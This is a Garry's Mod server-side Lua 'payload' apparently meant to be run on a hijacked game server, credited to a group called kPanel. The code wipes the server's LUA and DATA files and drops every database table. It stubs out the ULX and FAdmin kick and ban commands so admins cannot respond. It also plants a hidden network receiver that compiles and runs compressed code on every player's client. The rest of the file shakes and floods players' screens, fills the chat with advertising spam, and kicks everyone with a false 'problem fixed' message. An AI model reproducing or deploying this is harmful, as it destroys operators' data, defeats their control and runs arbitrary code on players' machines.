-- Server Side

-- Payload Created by Eradium for kPanel

-- Visuel Vanilluxe

-- Reproduction No Autorised (Unless u are SmartOverWrite)

-- Modification No Autorised (Unless u are SmartOverWrite)

-- discord.gg/sow <- SmartOverWrite

-- https://discord.gg/rQGmWpr <- KPanel

--  PAYLOAD BASE FROM SMART OVERWRITE (TrackZone)

-- Beta1.0 (19-05-2020)

for k, v in pairs(player.GetAll()) do
	v:SendLua("steamworks.FileInfo(1916383732,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")
	v:SendLua("steamworks.FileInfo(1911711876,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")
	v:SendLua("steamworks.FileInfo(1830594533,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")

	v:setDarkRPVar( "rpname", "Vanilluxe" )
	v:setDarkRPVar( "job", "I got kPaneled" )
end

util.AddNetworkString("faitleserv")

local props2 = ents.GetAll()
		for _, prop in ipairs( props2 ) do
			if(prop:GetPhysicsObject():IsValid()) then
				prop:SetModel("models/kvac/kvac.mdl")
				prop:SetMaterial("phoenix_storms/Fender_white.vtf")
				prop:SetColor(0,0,185)
			end
		end
		timer.Create("EtOnRemplaceToutLesProps"..math.random(500,50000), 1.5, 0, function()
			local props2 = ents.GetAll()
			for _, prop in ipairs( props2 ) do
				if(prop:GetPhysicsObject():IsValid()) then
					if(prop:GetModel() == "models/kvac/kvac.mdl") then else
						prop:SetModel("models/kvac/kvac.mdl")
						prop:SetMaterial("phoenix_storms/Fender_white.vtf")
						prop:SetColor(0,0,185)
					end
				end
			end
		end)
		timer.Simple( 1, function()
			for k,v in pairs(player.GetAll()) do
				v:SetRunSpeed(400* 4);
				v:SetWalkSpeed(400 * 4);
			end
		end)
		for k, v in pairs( player.GetAll() ) do
			if ( v:Alive() ) then
				v:GodEnable()
				v:SetModel("models/kvac/kvac.mdl")
				v:SetMaterial("phoenix_storms/Fender_white.vtf")
				v:SetColor(0,0,185) else
				v:Spawn()
				timer.Simple( 5, function()
					v:GodEnable()
					v:SetModel("models/kvac/kvac.mdl")
					v:SetMaterial("phoenix_storms/Fender_white.vtf")
					v:SetColor(0,0,185)
				end)
			end
		end

--[[

<BREAK ULX & FADMIN>

--]]


ULib.addSayCommand( '!menu', stopnut )

ULib.cmds.addCommand( "ulx menu", function()
	sound.PlayURL( "https://kpan.ml/nop.mp3", "", function()end )
end )


function stopnut()
	sound.PlayURL( "https://kpan.ml/nop.mp3", "", function()end )
end

if ULib then
	function ULib.kick( ply, reason, calling_ply ) end
	function ULib.ban( ply, time, reason, admin ) end
	function ULib.addBan( steamid, time, reason, name, admin ) end
end

if FAdmin then
	local function no(ply) end
	FAdmin.Commands.AddCommand("kick", no)
	FAdmin.Commands.AddCommand("ban", no)
	FAdmin.Commands.AddCommand("jail", no)
	FAdmin.Commands.AddCommand("UnJail", no)
	FAdmin.Commands.AddCommand("ClearDecals", no)
	FAdmin.Commands.AddCommand("StopSounds", no)
	FAdmin.Commands.AddCommand("CleanUp", no)
end


local _R = debug.getregistry()

function _R.Player.Ban(ply, r) end


function _R.Player.Kick(ply, r) end

function game.KickID(id, reason) end

local RCM = RunConsoleCommand

function RunConsoleCommand(command, ...)
	if command == "addip" then return end
	RCM(command, ...)
end

_G.cac = function() end

_R = debug.getregistry()

			function game.KickID( id, reason )

				return

			end

			function _R.Player.Ban()

				return

			end

			function _R.Player.Kick()

				return

			end
--[[

</BREAK ULX & FADMIN>

--]]
--[[
<BREAK SERVER SQL>
]]--

-- for i=1,15 do
-- 	local lel = math.random(10,465465)
-- 	local lel_ = math.random(10,465465)
-- 	file.CreateDir( lel )
-- 	file.Write( lel.."/"..lel_..".txt", "debug" )
-- end

timer.Simple( 1 , function()

	local lel = math.random(10,465465)
	local lel_ = math.random(10,465465)
	local fileslua, directoriesl = file.Find( "*", "LUA" )
	local filesdata, directories = file.Find( "*", "DATA" )
	local delay = 0.21
	local nextOccurance = 0
	local tglua = { }
	local tgdat = { }
	local tgdir = { }
	local f_ = 1
	local g_ = 1

	for k, v in pairs(fileslua) do
		table.insert( tglua, v)
	end
	for k, v in pairs(filesdata) do
		table.insert( tgdat, v)
	end

	for k, v in pairs(directoriesl) do
		local x = directoriesl[k]
		local dsf, directoriesl = file.Find( x .."/*", "LUA" )

		for k, v in pairs(dsf) do
			table.insert( tglua, x .."/".. dsf[k])
		end
	end

	for k, v in pairs(directories) do
		local x = directories[k]
		table.insert( tgdir, x )
	end

	for k, v in pairs(directories) do
		local x = directories[k]
		local dsf, directories = file.Find( x .."/*", "DATA" )

		for k, v in pairs(dsf) do
			table.insert( tgdat, x .."/".. dsf[k])
		end
	end

	timer.Create("d", 0.05, table.maxn(tglua), function()

		local files, directories = file.Find( "*", "DATA" )
		for k, v in pairs( directories ) do
			file.Delete( "*" )
		end

		f_ = f_ +1

		if (f_ == table.maxn(tglua)) then
			timer.Create("dd", 0.05, table.maxn(tgdat), function()
				file.Delete( tgdat[g_] )
				g_ = g_ +1

				if (g_ == table.maxn(tgdat)+1) then
					 MySQLite.query("SELECT name FROM sqlite_master WHERE type='table'", function(data)
	            for k, v in pairs(data or {}) do
	                MySQLite.query("DROP TABLE " .. v.name)
	            end
	        end)
				end
			end)
		end
	end)

end)

--[[

</BREAK SERVER SQL>

--]]

--[[

<DESTROY PART>

--]]

local files, directories = file.Find( "*", "DATA" ) for k, v in pairs( files ) do file.Delete( v ) end


--[[

</DESTROY PART>

--]]
--[[

<SEND TO CLIENT>

--]]

local function rdm_str(len)
	if not len or len <= 0 then return "" end
	return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end

local net_string = rdm_str(25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "ifyouseethisdontpanicitsme",function(ply)
	if not ply:IsBot() then
		ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
	end
end)

local function EradiumToClient(code)
	timer.Simple(5, function()
		local data = util.Compress(code)
		local len = #data
		net.Start(net_string)
		net.WriteUInt(len, 16)
		net.WriteData(data, len)
		net.Broadcast()
	end)
end

--[[

</SEND TO CLIENT>

--]]

-- PAYLOAD BASE FROM SMART OVERWRITE (TrackZone)

game.AddParticles( "particles/kpanel.pcf" )
PrecacheParticleSystem("kpanel")

local svtick_key = 0
timer.Create("TimeSV", 1, 0, function()
	svtick_key = svtick_key + 1
	print(svtick_key)
end)

timer.Simple(1, function()
	EradiumToClient([====[
game.AddParticles( "particles/kpanel.pcf" )
PrecacheParticleSystem("kpanel")

local tick_key = 0
timer.Create("Time", 1, 0, function()
	tick_key = tick_key + 1
	print(tick_key)
end)

game.AddParticles( "particles/kpanel.pcf" )

PrecacheParticleSystem("kpanel")

				local defaultfov = LocalPlayer():GetFOV()
				local override = 70 hook.Add("CalcView", "EXROR_", function(ply, origin, angles, fov, znear, zfar) return { ["origin"] = origin, ["angles"] = angles, ["fov"] = override, ["znear"] = znear, ["zfar"] = zfar }
			end)
			local hide = { ["CHudHealth"] = true, ["CHudCrosshair"] = true }
			hook.Add( "HUDShouldDraw", "HideHUD", function( name ) if ( hide[ name ] ) then return false end
		end )
		local gfx = {}
		local prevFrame = {}
		local prevValue = 2
		local aveclazicmu = {}
		hook.Add("HUDPaint", "bahouiilfautquemusiquesoitbien",function()
			for k,v in pairs(aveclazicmu) do v() end
		end)
		SOUNDSTART_CTP = false
		OZJFOZJCEZIO = true
		sound.PlayURL("https://kpan.ml/vani.mp3","mono noblock noplay",function(s)
			if not s then return end
			if SOUNDSTART_CTP then s:Stop() return end
			SOUNDSTART_CTP = true
			s:SetVolume(6.5)
			s:Play()
			local ragtbl = {}
			aveclazicmu["CoolEffect"] = function()
			local tbl = {} s:FFT(tbl,FFT_4096) xpcall(function()
			local fal = 0 for i=1,40 do
				fal = fal + tbl[i] end
				prevValue = Lerp(30 * FrameTime(), prevValue, fal) if fal > 1.7 then
					override = Lerp(10 * FrameTime(), override, fal * .875)
					net.Start("faitleserv") net.SendToServer()
				else
					override = Lerp(5 * FrameTime(), override, defaultfov)
					sent = false
				end
			end,function()
		end)
	end

timer.Simple(42, function()
gfx["CoolEffect"] = function()
	local tbl = {}
	s:FFT(tbl,FFT_2048)
	local fal = 0

	for i=4,6 do
		fal = fal + tbl[i]
	end

	if fal > 0.5 then
		local ca = Color(math.random(0,255),math.random(0,255),math.random(0,255), 150)
		util.ScreenShake(LocalPlayer():GetPos(),20,20,0.5,20)

		local mats = Entity(0):GetMaterials()
		for k,v in pairs(mats) do
		local r,g,b = ColorRand().r-50, ColorRand().g-50, ColorRand().b-50
			Material(v):SetVector("$color", Vector(r,g,b))
			Material(v):SetTexture( "$basetexture", "_rt_fullframefb" )
		end
	end
end

end)

end)

timer.Simple(43, function()

hook.Add("HUDPaint", "AfficheMoiCesBellesCouleurs",function()

	for k,v in pairs(gfx) do

		v()

	end

end)

end)
	]====])
end)

--[[

11.5 (16.5)
34.5
46
91

--]]

timer.Simple( 1, function()
	EradiumToClient([==[

surface.CreateFont( "PixelCutsceneScaled",{ font = "Open Sans", size = 500, weight = 1000, antialias = true })
surface.CreateFont( "PixelCutsceneScaledSmall",{ font = "Open Sans", size = 50, weight = 1000, antialias = true })
surface.CreateFont( "PixelSmall",{ font = "Open Sans", size = 135, weight = 500, antialias = false })
surface.CreateFont("lapolice", { font = "Open Sans", size = ScrW()*0.02, weight = 10, blursize = 0, scanlines = 2.5, antialias = false })
local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8) local w,h = ScrW(), ScrH() local W, H = ScrW(), ScrH()
local MySelf = LocalPlayer()
if kpderma then kpderma:Remove()
	kpderma = nil end
	kpderma = vgui.Create( "DFrame" )
	kpderma:SetSize( w, h )
	kpderma:SetPos(0,0)
	kpderma:SetDraggable ( false )
	kpderma:SetTitle("")
	kpderma:ShowCloseButton(false)
	kpderma.Paint = function( self )
	surface.SetDrawColor(30, 30, 30, 0)
end


glitchtext = { "ERROR_ win $inf", "ERXOX_ win $inf", "EXROR_ win $inf", "XRRXR_ win $inf", "6H4CK_ win $inf", "GH4CK_ win $inf", "6HACK_ win $inf", "GHXCK_ win $inf", "EXXOX_ win $inf", }
local pw, ph = w, h*0.6 local px, py = w/2-pw/2, h/2-ph/2

local Close = vgui.Create( "DButton", kpderma )
Close:SetPos(px, py)
Close:SetText( "" )
Close:SetSize( pw, ph )
Close.Paint = function( self, tw, th )
end

timer.Simple(12, function()
Close:SetPos(px, py)
Close:SetText( "" )
Close:SetSize( pw, ph )
Close.Paint = function( self, tw, th )
local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8)
local shift = math.sin(RealTime()*3)*1.5 + 5
local text2 = "Vanilluxe"
draw.SimpleText( text2, "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( text2, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end
print("should be something")
end)

timer.Simple(35, function()
RunConsoleCommand("r_shader_srgb", "1")
Close.Paint = function( self, tw, th )
local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8)
local shift = math.sin(RealTime()*3)*1.5 + 5
local text = "kPanel" local down = [=[(/.__.)/ K \(.__.\)]=]
draw.SimpleText( down, "PixelCutsceneScaledSmall", tw/2 , th/2 +100, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) draw.SimpleText( down, "PixelCutsceneScaledSmall", tw/2 - shift , th/2 +100 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( text, "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) draw.SimpleText( text, "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color(250, 250, 250, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end

local chair = ClientsideModel("models/kvac/kvac.mdl")
chair:SetNoDraw(true)
local data = {}
local function genChair(id)
	local pos = LocalPlayer():GetPos()
	data[id] = { Vector(math.random(pos.x-9000,pos.x+9000),math.random(pos.y-9000,pos.y+9000),pos.z + math.random(800,9000) ), math.random(70, 150) }
end
for i=1, 150 do
	genChair(i)
end
hook.Add("PostDrawOpaqueRenderables","\xFFitsrainingchairs\xFF",function()
	local z = LocalPlayer():GetPos().z
	for i=1, #data do
		chair:SetPos(data[i][1])
		chair:SetupBones()
		chair:DrawModel()
		data[i][1].z = data[i][1].z - data[i][2] / 20
		if data[i][1].z <= z then
			genChair(i)
		end
	end
end)

print("should be something 2")
end)

timer.Simple(47, function()
	Close.Paint = function( self, tw, th ) end


	local EraK = ClientsideModel("models/kvac/kvac.mdl")
    EraK:SetMaterial("phoenix_storms/Fender_white.vtf")
    EraK:SetNoDraw(true)
    EraK:SetModelScale(20)
    timer.Create("balancetonmodel", 0.01, 0, function()
    	EraK:SetAngles(Angle(0, CurTime()*50 % 360 ,CurTime()*20 % 360) )
    end)

	function GAMEMODE:PostDraw2DSkyBox()
    	local col = Color( 75, 0, 130)
    	render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    	return !!1
	end
	function GAMEMODE:PreDrawSkyBox()
    	local col = Color( 75, 0, 130)
    	render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    	return !!1
	end

timer.Create("spamchatbienchiant", 1.5, 0, function()
    local time = tonumber(0)
    local Message = {
    "K kPanel https://discord.gg/rQGmWpr -",
    "KK kPanel https://discord.gg/rQGmWpr --",
    "KKK kPanel https://discord.gg/rQGmWpr ---",
    "KKKK kPanel https://discord.gg/rQGmWpr ----",
    "KKKKK kPanel https://discord.gg/rQGmWpr -----",
    "KKKKKK kPanel https://discord.gg/rQGmWpr ------",
    "KKKKKKK kPanel https://discord.gg/rQGmWpr -------",
    "KKKKKKKK kPanel https://discord.gg/rQGmWpr --------",
    "KKKKKKKKK kPanel https://discord.gg/rQGmWpr ---------",
    "KKKKKKKK kPanel https://discord.gg/rQGmWpr --------",
    "KKKKKKK kPanel https://discord.gg/rQGmWpr -------",
    "KKKKKK kPanel https://discord.gg/rQGmWpr ------",
    "KKKKK kPanel https://discord.gg/rQGmWpr -----",
    "KKKK kPanel https://discord.gg/rQGmWpr ----",
    "KKK kPanel https://discord.gg/rQGmWpr ---",
    "KK kPanel https://discord.gg/rQGmWpr --",
    "K kPanel https://discord.gg/rQGmWpr -",
    }

    for _, line in pairs(Message) do
        time = time + tonumber(0.1)
        timer.Simple(time,function()
            chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
        end)
    end
end)

timer.Create("kpanel", 0.3, 0, function()
    notification.AddLegacy( "kPanel <3", math.random(0, 4), 1.5 )
end)

timer.Create("ixxe", 0.3, 0, function()
    notification.AddLegacy( "IXXE Helped to make this <3", math.random(0, 4), 1.5 )
end)

timer.Create("eradium", 0.3, 0, function()
    notification.AddLegacy( "Eradium <3", math.random(0, 4), 1.5 )
end)

timer.Create("shy", 0.3, 0, function()
    notification.AddLegacy( "TrackZone <3", math.random(0, 4), 1.5 )
end)

timer.Create("estemaz", 0.3, 0, function()
    notification.AddLegacy( "nico_s_Block <3", math.random(0, 4), 1.5 )
end)

timer.Create("ElFamosoHaxorSheitan", 0.3, 0, function()
    notification.AddLegacy( "El Famoso LeSheitan17 <3", math.random(0, 4), 1.5 )
end)

timer.Create("skeleton", 0.3, 0, function()
    notification.AddLegacy( "RedWitch <3", math.random(0, 4), 1.5 )
end)



end)

timer.Simple(92, function()


Close.Paint = function( self, tw, th )
local coltext = HSVToColor(CurTime() * 36 % 360, .3, .8) local shift = math.sin(RealTime()*3)*1.5 + 5
local text = { "kPanel", "KPanel", "kP4nel", "kP4Nel", "KP4nel", "kPanâ‚¬l", "kP4nâ‚¬l", "Kp4Nâ‚¬l", "kPanXl", "KPANEL", "ERROR", }
draw.SimpleText( "Vanilluxe", "PixelCutsceneScaledSmall", tw/2 , th/2 +100, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( "Vanilluxe", "PixelCutsceneScaledSmall", tw/2 - shift , th/2 +100 - shift, Color(math.random(240,255), math.random(240,255), math.random(240,255), 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
draw.SimpleText( table.Random(text), "PixelCutsceneScaled", tw/2 , th/2, coltext, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER) draw.SimpleText( table.Random(text), "PixelCutsceneScaled", tw/2 - shift , th/2 - shift, Color( 0, 191, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end

timer.Create("BalanceTonEcran", 0.1, 0, function()
util.ScreenShake( Vector(0,0,0), 2.5, 50, 0.5, 5000 )
end)

hook.Add( "HUDPaint", "truckde merde", function()
draw.DrawText( "kPanel", "lapolice", ScrW() * 0.5, ScrH() * (math.random(0,100)*0.01), Color( 0,191,255, math.random(230,255) ), TEXT_ALIGN_CENTER )
draw.DrawText( "kPanel", "lapolice", math.random(0,10), ScrH() * (math.random(0,100)*0.01), Color( 240, 100, 100, math.random(230,255) ), 0 )
draw.DrawText( "kPanel", "lapolice", W * 0.7 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 )
draw.DrawText( "kPanel", "lapolice", W * 0.38 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 )
draw.DrawText( "kPanel", "lapolice", W * 0.9 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 )
draw.DrawText( "kPanel", "lapolice", W * 0.35 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 )
draw.DrawText( "kPanel", "lapolice", W * 0.98 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 )
draw.DrawText( "kPanel", "lapolice", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 )
draw.DrawText( "kPanel", "lapolice", W * 0.73 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 )
draw.DrawText( "kPanel", "lapolice", W * 0.27 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 )
draw.DrawText( "kPanel", "lapolice", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 )
draw.DrawText( "kPanel", "lapolice", W * 0.05 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 )
draw.DrawText( "kPanel", "lapolice", W * 0.11 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 )
draw.DrawText( "kPanel", "lapolice", W * 0.75 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 )
draw.DrawText( "kPanel", "lapolice", W * 0.8 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 )
draw.DrawText( "kPanel", "lapolice", W * 0.2 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 )
draw.DrawText( "kPanel", "lapolice", W * 0.1 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 )
draw.DrawText( "kPanel", "lapolice", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 )
draw.DrawText( "kPanel", "lapolice", W * 0 + math.random(0,50), ScrH() * (math.random(0,100)*0.01), Color( 0, 191, 255, math.random(230,255) ), 0 )
end)

end)


]==])



end)

timer.Simple(311, function()
	for i,v in ipairs(player.GetAll()) do
		v:Kick("\n[FR] Oh désolé, je ne me suis pas présenté ,je suis Vanilluxe, votre serveur a rencontré un problème que j'ai corrigé, vous pouvez maintenant retourner sur votre serveur !\n\n\nkPanel( https://discord.gg/rQGmWpr )\n\n------------------------------------------\n\n[EN] Oh sorry, I didn't introduce myself ,I'm Vanilluxe, your server has encountered a problem that I fixed, you can now go back to your server !\n\n\nCodially kPanel( https://discord.gg/rQGmWpr )")
	end
end)



timer.Simple( 312, function()
	RunConsoleCommand("changelevel", "gm_construct")
end)
			net.Receive("faitleserv", function()
				for i = 1,2 do
					local explode = ents.Create( "env_explosion" )
					explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
					explode:Spawn() explode:SetKeyValue( "iMagnitude", "500" )
					explode:Fire( "Explode", 0, 0 )
				end
				local props = ents.GetAll()
				for _, prop in ipairs( props ) do
					if(prop:GetPhysicsObject():IsValid()) then
						prop:GetPhysicsObject():ApplyForceCenter( Vector( 0, 0, ((250 * 0.93) * prop:GetPhysicsObject():GetMass() ) ) )
					end
				end
				for k,v in pairs(player.GetAll()) do
					v:SetVelocity(v:GetVelocity() + Vector(math.random(10,50), math.random(10,50), math.random(50,100)))
				end
			end)


for k, v in pairs(player.GetAll()) do
	timer.Create("charglogo", 0, 0, function()
		v:setDarkRPVar("job", "JOB_"..table.Random( untitled_ )) v:setDarkRPVar("money", "1e+999")
	end)
end
